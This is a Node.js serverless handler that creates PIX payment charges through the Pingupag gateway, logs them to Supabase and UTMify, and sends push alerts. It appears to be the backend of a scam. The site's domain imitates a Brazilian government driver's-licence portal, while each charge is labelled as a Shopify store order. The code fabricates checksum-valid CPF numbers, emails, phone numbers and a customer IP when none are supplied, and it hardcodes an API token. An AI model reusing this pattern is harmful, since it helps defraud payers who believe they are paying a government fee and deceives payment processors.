const https = require("https");
const { getSupabase } = require("./lib/supabase");
const PINGUPAG_BASE = "app.pingupag.com";
const PINGUPAG_API_KEY = process.env.PINGUPAG_SECRET_KEY;
const UTMIFY_TOKEN = "lzASZob4ldSJJc3jT1LILy9alPxWJgpnPhCh";
const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const utmifyCache = new Map();
const CACHE_TTL = 60000;

function httpsRequest(hostname, path, method, headers, body, timeoutMs) {
  return new Promise((resolve, reject) => {
    const options = { hostname, path, method, headers, timeout: timeoutMs || 30000 };
    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => { data += chunk; });
      res.on("end", () => resolve({ status: res.statusCode, body: data }));
    });
    req.on("timeout", () => { req.destroy(); reject(new Error("Request timeout")); });
    req.on("error", reject);
    if (body) req.write(body);
    req.end();
  });
}

function gerarCpfValido() {
  const d = new Array(9);
  for (let i = 0; i < 9; i++) d[i] = Math.floor(Math.random() * 10);
  let soma = 0;
  for (let i = 0; i < 9; i++) soma += d[i] * (10 - i);
  let resto = soma % 11;
  d[9] = resto < 2 ? 0 : 11 - resto;
  soma = 0;
  for (let i = 0; i < 10; i++) soma += d[i] * (11 - i);
  resto = soma % 11;
  d[10] = resto < 2 ? 0 : 11 - resto;
  return d.join("");
}

function fmtPhone(phone) {
  if (!phone) return "11999999999";
  const digits = phone.replace(/\D/g, "");
  if (digits.length >= 11) return digits.slice(0, 11);
  if (digits.length >= 10) return digits.slice(0, 10);
  return "11999999999";
}

async function sendUtmify(transactionId, status, customer, amountCents, createdAt, utms) {
  if (utmifyCache.has(transactionId)) return;
  utmifyCache.set(transactionId, true);
  setTimeout(() => utmifyCache.delete(transactionId), CACHE_TTL);
  try {
    const gatewayFeeCents = Math.round(amountCents * 0.02);
    const netCents = amountCents - gatewayFeeCents;
    const payload = JSON.stringify({
      orderId: transactionId,
      platform: "Pingupag",
      paymentMethod: "pix",
      status,
      createdAt: createdAt || new Date().toISOString().replace("T", " ").slice(0, 19),
      approvedDate: status === "paid" ? new Date().toISOString().replace("T", " ").slice(0, 19) : null,
      customer: { name: customer.name || null, email: customer.email || null, phone: customer.phone || null, document: customer.cpf || null, country: "BR", ip: "177.0.0.1" },
      products: [{ id: "loja-shopify-br-001", name: "SHOPIFY LOJA 03", quantity: 1, priceInCents: amountCents }],
      trackingParameters: { utm_source: utms?.utm_source || null, utm_campaign: utms?.utm_campaign || null, utm_medium: utms?.utm_medium || null, utm_content: utms?.utm_content || null, utm_term: utms?.utm_term || null },
      commission: { totalPriceInCents: amountCents, gatewayFeeInCents: gatewayFeeCents, userCommissionInCents: netCents, currency: "BRL" },
    });
    await httpsRequest("api.utmify.com.br", "/api-credentials/orders", "POST", { "Content-Type": "application/json", "x-api-token": UTMIFY_TOKEN, "Content-Length": Buffer.byteLength(payload) }, payload, 3000);
    console.log("[UTMify] OK Enviado:", transactionId);
  } catch (err) {
    console.error("[UTMify] Erro (nao bloqueia):", err.message);
  }
}

async function sendPushNotification(title, message, tag, type, transactionId, amount, customerName) {
  try {
    const payload = JSON.stringify({ title, message, tag, type, transactionId, amount, customerName });
    await httpsRequest("brasil-cnh-gov.netlify.app", "/api/pwa-send-push", "POST", {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload),
    }, payload, 5000);
    console.log("[PWA-PUSH] Notificação enviada:", tag);
  } catch (err) {
    console.error("[PWA-PUSH] Erro ao enviar push (não bloqueia):", err.message);
  }
}

function jsonResponse(statusCode, body) {
  return { statusCode, headers: { "Content-Type": "application/json; charset=utf-8", "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Content-Type, Authorization", "Access-Control-Allow-Methods": "GET,POST,OPTIONS" }, body: JSON.stringify(body) };
}

exports.handler = async (event) => {
  console.log("[PIX-PINGUPAG] ===== FUNCAO INICIADA =====");
  if (!PINGUPAG_API_KEY) {
    console.error("Credenciais Pingupag nao configuradas!");
    return jsonResponse(500, { success: false, error: "Credenciais da gateway nao configuradas", debug: "PINGUPAG_SECRET_KEY nao encontrada" });
  }
  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 204, headers: { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Content-Type, Authorization", "Access-Control-Allow-Methods": "GET,POST,OPTIONS" }, body: "" };
  }
  let body = {};
  try { body = event.body ? JSON.parse(event.body) : {}; } catch { body = {}; }
  const randId = Math.random().toString(36).slice(2, 10);
  const rawAmount = body.amount ?? body.valor ?? body.total ?? 20.00;
  const amountReais = Number(rawAmount) || 20.00;
  const amountCents = Math.round(amountReais * 100);
  const customerName = (body.nome || body.name || body.customer_name || `Cliente ${randId}`).toString().trim();
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@gmail.com`).toString().trim();
  const customerPhone = fmtPhone(body.phone || body.customer_phone || "11999999999");
  const cpfRaw = (body.cpf || body.document || body.customer_cpf || "").toString().replace(/\D/g, "");
  const customerCpf = cpfRaw.length === 11 ? cpfRaw : gerarCpfValido();
  const utms = body.utm || {};
  const externalRef = `order_${randId}_${Date.now()}`;
  const webhookBase = process.env.WEBHOOK_BASE_URL || "https://brasil-cnh-gov.netlify.app";
  const postbackUrl = `${webhookBase}/api/webhook/pingupag`;
  console.log("[PIX-PINGUPAG] Amount:", amountReais, "Cents:", amountCents);
  console.log("[PIX-PINGUPAG] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });

  const payload = JSON.stringify({
    amount: amountCents,
    description: "SHOPIFY LOJA 03",
    reference: externalRef,
    postback_url: postbackUrl,
    source: "api_externa",
    customer: {
      name: customerName,
      email: customerEmail,
      document: customerCpf,
      phone: customerPhone,
    },
    tracking: {
      utm_source: utms.utm_source || null,
      utm_medium: utms.utm_medium || null,
      utm_campaign: utms.utm_campaign || null,
      utm_content: utms.utm_content || null,
      utm_term: utms.utm_term || null,
      src: utms.src || null,
      sck: utms.sck || null,
    },
  });

  try {
    const resp = await httpsRequest(PINGUPAG_BASE, "/gateway/v1/transaction", "POST", {
      "Content-Type": "application/json",
      "X-API-Key": PINGUPAG_API_KEY,
      "Content-Length": Buffer.byteLength(payload),
    }, payload, 30000);
    const text = resp.body;
    if (resp.status < 200 || resp.status >= 300) {
      let errMsg = text;
      try { errMsg = JSON.parse(text)?.message || errMsg; } catch {}
      console.error("[Pingupag] Erro HTTP:", resp.status, errMsg);
      return jsonResponse(resp.status, { success: false, error: errMsg, debug: { status: resp.status, body: text.substring(0, 200) } });
    }
    let parsed = {};
    try { parsed = JSON.parse(text); } catch {
      console.error("[Pingupag] Parse error:", text.substring(0, 200));
      return jsonResponse(500, { success: false, error: "Resposta invalida da gateway", debug: text.substring(0, 200) });
    }
    const transactionId = String(parsed.transaction_id || parsed.id || "");
    const pixCode = parsed.qr_code || null;
    const pixBase64 = parsed.qr_code_base64 || null;
    if (!transactionId || !pixCode) {
      console.error("[Pingupag] Resposta incompleta:", { transactionId, pixCode: !!pixCode });
      return jsonResponse(500, { success: false, error: "Gateway retornou resposta incompleta", debug: { transaction: transactionId, hasPix: !!pixCode } });
    }
    console.log("[PIX-PINGUPAG] PIX gerado com sucesso | ID:", transactionId);
    if (SUPABASE_URL && SUPABASE_KEY) {
      try {
        const supabase = getSupabase();
        await supabase.from("transactions").insert({
          transaction_id: transactionId, amount: amountReais, customer_name: customerName, customer_email: customerEmail,
          customer_cpf: customerCpf, customer_phone: customerPhone, status: "pending", brcode: pixCode,
          utm_source: utms.utm_source || null, utm_campaign: utms.utm_campaign || null, utm_medium: utms.utm_medium || null,
        });
        console.log("[Supabase] Salvo:", transactionId);
      } catch (err) { console.error("[Supabase] Erro (continuando):", err.message); }
    }
    await sendUtmify(transactionId, "waiting_payment", { name: customerName, email: customerEmail, phone: customerPhone, cpf: customerCpf }, amountCents, new Date().toISOString().replace("T", " ").slice(0, 19), utms).catch(err => console.error("[UTMify] Erro:", err.message));
    const amountReaisFmt = amountReais.toFixed(2).replace(".", ",");
    await sendPushNotification(
      "💰 PIX Gerado",
      `R$ ${amountReaisFmt} - ${customerName}\nID: ${transactionId}`,
      `pix-gerado-${transactionId}`,
      "generated",
      transactionId,
      amountReais,
      customerName
    );
    return jsonResponse(200, {
      success: true, pixCode, pix_code: pixCode, brcode: pixCode, payload: pixCode, qr_code_image: pixBase64,
      transaction_id: transactionId, transactionId, deposit_id: transactionId, e2e: null, status: "pending",
    });
  } catch (err) {
    console.error("[PIX-PINGUPAG] Erro ao chamar gateway:", err.message);
    return jsonResponse(502, { success: false, error: "Falha ao conectar com gateway: " + String(err) });
  }
};